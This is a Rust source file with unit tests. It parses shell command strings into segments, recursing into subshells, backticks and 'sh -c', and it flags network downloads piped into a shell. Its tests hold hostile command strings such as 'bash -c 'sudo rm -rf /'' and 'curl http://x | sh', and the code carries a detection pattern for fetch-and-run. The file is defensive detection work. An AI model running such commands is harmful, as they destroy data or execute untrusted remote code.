const MAX_RECURSION_DEPTH: usize = 4;
const PIPE_TO_SHELL: &str = "pipe-to-shell";

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Segment {
    pub argv: Vec<String>,
    pipe_from_previous: bool,
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct CommandSegments {
    pub segments: Vec<Segment>,
    pub parse_ok: bool,
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum Quote {
    Single,
    Double,
    Backtick,
}

#[derive(Clone, Debug, PartialEq, Eq)]
struct RawSegment {
    command: String,
    pipe_from_previous: bool,
}

pub fn extract_command_segments(command: &str) -> CommandSegments {
    if is_windows_command(command) {
        return CommandSegments {
            segments: Vec::new(),
            parse_ok: false,
        };
    }

    let mut segments = Vec::new();
    let parse_ok = extract_recursive(command, 0, &mut segments).is_ok();
    let parse_ok = parse_ok
        && !segments
            .iter()
            .any(|segment| executable_basename(segment).is_some_and(is_windows_executable));
    if !parse_ok {
        segments.clear();
    }
    CommandSegments { segments, parse_ok }
}

pub fn structural_flags(segments: &CommandSegments) -> Vec<&'static str> {
    if !segments.parse_ok {
        return Vec::new();
    }
    if segments.segments.windows(2).any(|pair| {
        pair[1].pipe_from_previous
            && executable_is(&pair[0], &["curl", "wget"])
            && executable_is(&pair[1], &["sh", "bash", "zsh", "dash"])
    }) {
        vec![PIPE_TO_SHELL]
    } else {
        Vec::new()
    }
}

pub fn segment_command(segment: &Segment) -> String {
    segment.argv.join(" ")
}

pub fn executable_basename(segment: &Segment) -> Option<&str> {
    segment
        .argv
        .first()
        .and_then(|value| value.rsplit(['/', '\\']).next())
        .filter(|value| !value.is_empty())
}

fn executable_is(segment: &Segment, names: &[&str]) -> bool {
    executable_basename(segment).is_some_and(|value| names.contains(&value))
}

fn extract_recursive(command: &str, depth: usize, output: &mut Vec<Segment>) -> Result<(), ()> {
    if depth > MAX_RECURSION_DEPTH {
        return Err(());
    }

    let raw_segments = split_top_level(command)?;
    let mut nested = Vec::new();
    for raw in &raw_segments {
        let argv = shell_words::split(raw.command.trim()).map_err(|_| ())?;
        if argv.is_empty() {
            continue;
        }
        output.push(Segment {
            argv: argv.clone(),
            pipe_from_previous: raw.pipe_from_previous,
        });

        nested.extend(nested_commands(&raw.command)?);
        if let Some(inner) = shell_inner_command(&argv) {
            nested.push(inner.to_string());
        }
    }
    for inner in nested {
        extract_recursive(&inner, depth + 1, output)?;
    }
    Ok(())
}

fn split_top_level(command: &str) -> Result<Vec<RawSegment>, ()> {
    let chars: Vec<char> = command.chars().collect();
    let mut raw_segments = Vec::new();
    let mut start = 0;
    let mut index = 0;
    let mut quote = None;
    let mut escaped = false;
    let mut paren_depth = 0usize;
    let mut incoming_pipe = false;

    while index < chars.len() {
        let ch = chars[index];
        if escaped {
            escaped = false;
            index += 1;
            continue;
        }
        if ch == '\\' && quote != Some(Quote::Single) {
            escaped = true;
            index += 1;
            continue;
        }
        match quote {
            Some(Quote::Single) => {
                if ch == '\'' {
                    quote = None;
                }
                index += 1;
                continue;
            }
            Some(Quote::Double) => {
                if ch == '"' {
                    quote = None;
                }
                index += 1;
                continue;
            }
            Some(Quote::Backtick) => {
                if ch == '`' {
                    quote = None;
                }
                index += 1;
                continue;
            }
            None => {}
        }
        match ch {
            '\'' => quote = Some(Quote::Single),
            '"' => quote = Some(Quote::Double),
            '`' => quote = Some(Quote::Backtick),
            '(' => paren_depth += 1,
            ')' => {
                paren_depth = paren_depth.checked_sub(1).ok_or(())?;
            }
            _ => {}
        }
        if paren_depth == 0 {
            let delimiter_len = delimiter_len(&chars, index);
            if delimiter_len > 0 {
                let text: String = chars[start..index].iter().collect();
                push_raw_segment(&mut raw_segments, text, incoming_pipe);
                incoming_pipe = ch == '|' && delimiter_len == 1;
                index += delimiter_len;
                start = index;
                continue;
            }
        }
        index += 1;
    }

    if escaped || quote.is_some() || paren_depth != 0 {
        return Err(());
    }
    let text: String = chars[start..].iter().collect();
    push_raw_segment(&mut raw_segments, text, incoming_pipe);
    Ok(raw_segments)
}

fn delimiter_len(chars: &[char], index: usize) -> usize {
    match chars[index] {
        ';' | '\n' => 1,
        '|' => {
            if chars.get(index + 1) == Some(&'|') {
                2
            } else {
                1
            }
        }
        '&' => {
            if matches!(chars.get(index.wrapping_sub(1)), Some('>') | Some('<'))
                || chars.get(index + 1) == Some(&'>')
            {
                0
            } else if chars.get(index + 1) == Some(&'&') {
                2
            } else {
                1
            }
        }
        _ => 0,
    }
}

fn push_raw_segment(output: &mut Vec<RawSegment>, command: String, pipe_from_previous: bool) {
    if !command.trim().is_empty() {
        output.push(RawSegment {
            command,
            pipe_from_previous,
        });
    }
}

fn nested_commands(command: &str) -> Result<Vec<String>, ()> {
    let chars: Vec<char> = command.chars().collect();
    let mut commands = Vec::new();
    let mut index = 0;
    let mut quote = None;
    let mut escaped = false;

    while index < chars.len() {
        let ch = chars[index];
        if escaped {
            escaped = false;
            index += 1;
            continue;
        }
        if ch == '\\' && quote != Some(Quote::Single) {
            escaped = true;
            index += 1;
            continue;
        }
        if quote == Some(Quote::Single) {
            if ch == '\'' {
                quote = None;
            }
            index += 1;
            continue;
        }
        if ch == '\'' && quote.is_none() {
            quote = Some(Quote::Single);
            index += 1;
            continue;
        }
        if ch == '"' {
            quote = if quote == Some(Quote::Double) {
                None
            } else if quote.is_none() {
                Some(Quote::Double)
            } else {
                quote
            };
            index += 1;
            continue;
        }
        if ch == '`' {
            let end = find_backtick_end(&chars, index + 1)?;
            commands.push(chars[index + 1..end].iter().collect());
            index = end + 1;
            continue;
        }
        if ch == '$' && chars.get(index + 1) == Some(&'(') {
            let end = find_closing_paren(&chars, index + 1)?;
            commands.push(chars[index + 2..end].iter().collect());
            index = end + 1;
            continue;
        }
        if ch == '(' && is_command_group_start(&chars, index) {
            let end = find_closing_paren(&chars, index)?;
            commands.push(chars[index + 1..end].iter().collect());
            index = end + 1;
            continue;
        }
        index += 1;
    }
    Ok(commands)
}

fn find_backtick_end(chars: &[char], mut index: usize) -> Result<usize, ()> {
    let mut escaped = false;
    while index < chars.len() {
        if escaped {
            escaped = false;
        } else if chars[index] == '\\' {
            escaped = true;
        } else if chars[index] == '`' {
            return Ok(index);
        }
        index += 1;
    }
    Err(())
}

fn find_closing_paren(chars: &[char], open: usize) -> Result<usize, ()> {
    let mut depth = 1usize;
    let mut quote = None;
    let mut escaped = false;
    let mut index = open + 1;
    while index < chars.len() {
        let ch = chars[index];
        if escaped {
            escaped = false;
            index += 1;
            continue;
        }
        if ch == '\\' && quote != Some(Quote::Single) {
            escaped = true;
            index += 1;
            continue;
        }
        match quote {
            Some(Quote::Single) if ch == '\'' => quote = None,
            Some(Quote::Double) if ch == '"' => quote = None,
            Some(Quote::Backtick) if ch == '`' => quote = None,
            Some(_) => {}
            None => match ch {
                '\'' => quote = Some(Quote::Single),
                '"' => quote = Some(Quote::Double),
                '`' => quote = Some(Quote::Backtick),
                '(' => depth += 1,
                ')' => {
                    depth -= 1;
                    if depth == 0 {
                        return Ok(index);
                    }
                }
                _ => {}
            },
        }
        index += 1;
    }
    Err(())
}

fn is_command_group_start(chars: &[char], index: usize) -> bool {
    if index > 0 && chars[index - 1] == '$' {
        return false;
    }
    chars[..index]
        .iter()
        .rev()
        .find(|value| !value.is_whitespace())
        .is_none_or(|value| matches!(value, ';' | '&' | '|' | '('))
}

fn shell_inner_command(argv: &[String]) -> Option<&str> {
    let executable = argv.first()?.rsplit(['/', '\\']).next()?;
    if !matches!(executable, "sh" | "bash" | "zsh" | "dash") {
        return None;
    }
    argv.windows(2)
        .find_map(|pair| matches!(pair[0].as_str(), "-c" | "-lc").then_some(pair[1].as_str()))
}

fn is_windows_command(command: &str) -> bool {
    let trimmed = command.trim_start();
    let executable = trimmed
        .split_whitespace()
        .next()
        .unwrap_or_default()
        .trim_matches(['\'', '"'])
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or_default()
        .to_ascii_lowercase();
    is_windows_executable(&executable)
        || (trimmed.as_bytes().get(1) == Some(&b':')
            && trimmed
                .as_bytes()
                .first()
                .is_some_and(u8::is_ascii_alphabetic))
        || trimmed.contains("$env:")
        || trimmed.contains("$Env:")
}

fn is_windows_executable(executable: &str) -> bool {
    matches!(
        executable.to_ascii_lowercase().as_str(),
        "cmd" | "cmd.exe" | "powershell" | "powershell.exe" | "pwsh" | "pwsh.exe"
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    fn executable_names(command: &str) -> Vec<String> {
        extract_command_segments(command)
            .segments
            .iter()
            .filter_map(executable_basename)
            .map(str::to_string)
            .collect()
    }

    #[test]
    fn extracts_shell_structure_and_nested_commands() {
        for command in [
            "bash -c 'sudo rm -rf /'",
            "echo hi && sudo id",
            "true; sudo id",
            "$(sudo id)",
            "`sudo id`",
            "sh -c \"bash -c 'sudo id'\"",
            "(sudo id)",
        ] {
            let extracted = extract_command_segments(command);
            assert!(extracted.parse_ok, "{command:?}");
            assert!(
                executable_names(command).iter().any(|name| name == "sudo"),
                "{command:?}: {extracted:?}"
            );
        }
    }

    #[test]
    fn flags_only_network_fetch_piped_to_shell() {
        for command in [
            "curl http://x | sh",
            "wget -qO- x | bash -s",
            "curl http://x $(echo suffix) | sh",
            "sh -c 'curl http://x | dash'",
        ] {
            let extracted = extract_command_segments(command);
            assert_eq!(structural_flags(&extracted), vec![PIPE_TO_SHELL]);
        }
        for command in ["ls | grep sh", "curl http://x | cat", "echo sh"] {
            let extracted = extract_command_segments(command);
            assert!(structural_flags(&extracted).is_empty(), "{command:?}");
        }
    }

    #[test]
    fn executable_basename_does_not_match_arguments() {
        for command in ["echo sudo", "cat sudoku.txt"] {
            assert!(!executable_names(command).iter().any(|name| name == "sudo"));
        }
        let extracted = extract_command_segments("/usr/bin/sudo id");
        assert_eq!(executable_basename(&extracted.segments[0]), Some("sudo"));
    }

    #[test]
    fn depth_cap_fails_parsing_instead_of_partially_classifying() {
        let mut command = "sudo id".to_string();
        for _ in 0..=MAX_RECURSION_DEPTH {
            command = shell_words::join(["sh", "-c", command.as_str()]);
        }
        let extracted = extract_command_segments(&command);
        assert!(!extracted.parse_ok);
        assert!(extracted.segments.is_empty());
    }

    #[test]
    fn parse_failure_and_windows_input_return_no_segments() {
        for command in [
            "echo 'unterminated",
            "powershell.exe -Command 'sudo id'",
            "cmd /C dir",
            "true && pwsh -Command Get-ChildItem",
        ] {
            let extracted = extract_command_segments(command);
            assert!(!extracted.parse_ok, "{command:?}");
            assert!(extracted.segments.is_empty());
        }
    }
}
